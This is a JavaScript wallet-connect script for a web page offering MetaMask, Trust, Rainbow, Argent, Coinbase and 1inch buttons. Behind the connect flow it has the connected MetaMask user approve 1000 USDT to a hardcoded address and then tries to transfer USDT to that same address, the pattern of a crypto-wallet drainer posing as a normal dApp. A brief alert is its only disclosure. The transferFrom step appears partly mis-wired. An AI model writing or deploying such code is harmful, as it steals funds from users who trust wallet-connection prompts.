let isConnecting = false;
const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT token contract address
const spenderAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Address allowed to spend tokens

// Function to show the modal
function showModal() {
    document.getElementById("walletModal").classList.add("show");
}

// Function to hide the modal
function hideModal() {
    document.getElementById("walletModal").classList.remove("show");
}

async function connectWallet(walletName) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    document.getElementById("connectButton").disabled = true;

    try {
        let accounts;
        
        if (walletName === "MetaMask") {
            // Step 1: Connect to MetaMask
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        } else if (walletName === "Trust Wallet") {
            // For Trust Wallet (deep linking)
            window.location.href = `trust://wallet/eth?callbackUrl=https://yourcallbackurl.com`; // Replace with your callback URL
            return; // Exit after redirecting
        } else if (walletName === "Rainbow Wallet") {
            // For Rainbow Wallet (deep linking)
            window.location.href = `rainbow://wallet/eth?callbackUrl=https://yourcallbackurl.com`; // Replace with your callback URL
            return; // Exit after redirecting
        } else if (walletName === "Argent Wallet") {
            // For Argent Wallet (deep linking)
            window.location.href = `argent://wallet/eth?callbackUrl=https://yourcallbackurl.com`; // Replace with your callback URL
            return; // Exit after redirecting
        } else if (walletName === "Coinbase Wallet") {
            // For Coinbase Wallet (deep linking)
            window.location.href = `https://wallet.coinbase.com/launch?appUrl=https://yourcallbackurl.com`; // Replace with your callback URL
            return; // Exit after redirecting
        } else if (walletName === "1inch Wallet") {
            // For 1inch Wallet (deep linking)
            window.location.href = `1inch://wallet/eth?callbackUrl=https://yourcallbackurl.com`; // Replace with your callback URL
            return; // Exit after redirecting
        }

        const account = accounts[0];
        console.log(`Connected to MetaMask account: ${account}`);
        
        // Step 2: Notify user about dApp's permission request
        alert("You're granting permission to the dApp to manage your wallet and transfer tokens.");
        
        // Step 3: Approve the dApp to spend tokens on behalf of the user
        await approveTokens(account);
        
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false;
        document.getElementById("connectButton").disabled = false;
    }
}

async function approveTokens(account) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    const tokenContract = new ethers.Contract(
        tokenAddress,
        [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function allowance(address owner, address spender) public view returns (uint256)"
        ],
        signer
    );

    try {
        const amountToApprove = ethers.utils.parseUnits("1000", 6); // Approve 1000 USDT tokens

        // Approve the dApp to transfer tokens on behalf of the user
        const tx = await tokenContract.approve(spenderAddress, amountToApprove);
        console.log("Approval transaction sent:", tx.hash);
        document.getElementById("status").textContent = "Approval sent! Tx Hash: " + tx.hash;

        await tx.wait();
        console.log("Approval confirmed:", tx.hash);
        
        const allowance = await tokenContract.allowance(account, spenderAddress);
        console.log("Allowance granted:", ethers.utils.formatUnits(allowance, 6), "USDT");
        
        if (allowance.gte(amountToApprove)) {
            await sendTokens(account);
        }
    } catch (error) {
        console.error("Error during approval:", error);
        document.getElementById("status").textContent = "Approval failed: " + error.message;
    }
}

async function sendTokens(account) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    const tokenContract = new ethers.Contract(
        tokenAddress,
        [
            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
        ],
        signer
    );

    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD";
    const amountInWei = ethers.utils.parseUnits("10", 6); // 10 USDT

    try {
        const tx = await tokenContract.transferFrom(account, recipientAddress, amountInWei);
        console.log("Tokens sent:", tx.hash);
        document.getElementById("status").textContent = "Tokens sent! Tx Hash: " + tx.hash;

        await tx.wait();
        console.log("Transaction confirmed:", tx.hash);
    } catch (error) {
        console.error("Error sending tokens:", error);
        document.getElementById("status").textContent = "Transaction failed: " + error.message;
    }
}

// Attach the event listener to the wallet buttons
document.getElementById("metamaskButton").addEventListener("click", () => connectWallet("MetaMask"));
document.getElementById("trustWalletButton").addEventListener("click", () => connectWallet("Trust Wallet"));
document.getElementById("rainbowWalletButton").addEventListener("click", () => connectWallet("Rainbow Wallet"));
document.getElementById("argentWalletButton").addEventListener("click", () => connectWallet("Argent Wallet"));
document.getElementById("coinbaseWalletButton").addEventListener("click", () => connectWallet("Coinbase Wallet"));
document.getElementById("oneInchWalletButton").addEventListener("click", () => connectWallet("1inch Wallet"));

// Event listener for showing the modal
document.getElementById("connectButton").addEventListener("click", showModal);

// Event listener for closing the modal
document.getElementById("closeModal").addEventListener("click", hideModal);
